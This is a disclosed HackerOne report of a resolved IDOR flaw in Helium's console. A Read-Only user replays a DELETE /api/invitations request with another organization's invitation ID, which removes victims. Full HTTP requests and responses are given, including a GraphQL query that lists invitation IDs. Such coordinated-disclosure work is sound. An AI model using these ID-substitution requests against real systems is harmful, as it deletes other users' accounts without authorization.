---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/insecure-direct-object-reference-idor
  - env/web
substate: "resolved"
weakness: "Insecure Direct Object Reference (IDOR)"
enriched: true
body: true
date: 2020-07-10
submitted: 2020-06-01T19:08:51.888Z
bounty_usd: null
votes: 19
cve: []
program: "[[programs/helium|Helium]]"
reporter: "amr_"
source: "https://hackerone.com/reports/888729"
title: "Read-Only user can delete users"
---
# Read-Only user can delete users

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 19 | **Program:** Helium | **Disclosed:** 2020-07-10

- Report: [https://hackerone.com/reports/888729](https://hackerone.com/reports/888729)
- CWE: Insecure Direct Object Reference (IDOR)
- Submitted: 2020-06-01T19:08:51.888Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

hello 
this endpoint (DELETE /api/invitations/0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8 )vulnerable  to Insecure Direct Object Reference
Steps to reproduce the bug
Let's assume that three accounts exist:
admin@helium.com        (role Administrator)
attacker@helium.com   (role Read-Only)
victim@helium.com        (invited user )
all three account in same organization (h1)
attacker@helium.com cant delete victim@helium.com but we can do that 
from admin@helium.com go to delete victim@helium.com 
request like that DELETE /api/invitations/0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8
take id victim@helium.com 0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8
go to attacker@helium.com switch another organization (h2)
and go to delete invited user from this organization(h2)
DELETE /api/invitations/a996881d-7177-43fb-be7c-da3a6b005f40
change id (a996881d-7177-43fb-be7c-da3a6b005f40) to id you got from admin@helium.com(0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8)
respond 
HTTP/1.1 204 No Content
Date: Mon, 01 Jun 2020 18:47:43 GMT
Content-Length: 0
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Message: User removed from organization
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur
CF-Cache-Status: DYNAMIC
cf-request-id: 0312cf14d40000edeb299e9200000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 59cb1ace2eeaedeb-CDG

now account victim@helium.com deleted from attacker@helium.com
i can make poc 
thanks

## Impact

Read-Only user can delete users

## Timeline

- **Report Filed**
- **2020-06-03** @amr_: hello 
i got another way to get id of victim 
Steps to reproduce the bug
admin@helium.com (role Administrator)
attacker@helium.com (role Read-Only)
victim@helium.com (invited user )
all three account in same organization (h1)

1-from attacker@helium.com 
make request 
POST /graphql HTTP/1.1
Host: console.helium.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://console.helium.com/users
content-type: application/json
authorization: Bearer 
organization: f56bba4b-26fc-48b3-958c-b73bbdb01635
Origin: https://console.helium.com
Content-Length: 466
Connection: close
Cookie: 
{"operationName":"PaginatedInvitationsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedInvitationsQuery($page: Int, $pageSize: Int) {\n  invitations(page: $page, pageSize: $pageSize) {\n    entries {\n      ...InvitationFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment InvitationFragment on Invitation {\n  id\n  email\n  role\n  inserted_at\n  __typename\n}\n"}
  
respond 
HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 07:31:33 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur
CF-Cache-Status: DYNAMIC
cf-request-id: 031ab0be370000dbf395b4c200000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 59d7b7105e48dbf3-LHR
Content-Length: 295

{"data":{"invitations":{"__typename":"PaginatedInvitations","entries":[{"__typename":"Invitation","email":"amrradwan12345678@yahoo.com","id":"e78c92e4-f3e8-4540-87d8-44323864fa4f","inserted_at":"2020-06-01T18:41:46","role":"read"}],"pageNumber":1,"pageSize":10,"totalEntries":1,"totalPages":1}}}


2-you get id of victim e78c92e4-f3e8-4540-87d8-44323864fa4f
3-go switch another organization (h2)
4-go delete invited user 
request 
DELETE /api/invitations/0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8 
5-chnage this id (0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8 ) with id from step
 (e78c92e4-f3e8-4540-87d8-44323864fa4f)
respond
HTTP/1.1 204 No Content
Date: Mon, 01 Jun 2020 18:47:43 GMT
Content-Length: 0
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Message: User removed from organization
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur
CF-Cache-Status: DYNAMIC
cf-request-id: 0312cf14d40000edeb299e9200000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 59cb1ace2eeaedeb-CDG

now user deleted 
thanks
- **2020-06-03** @amr_: i made poc
- **2020-06-05** @amr_: hello any update
- **2020-06-07** @amr_: any update
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
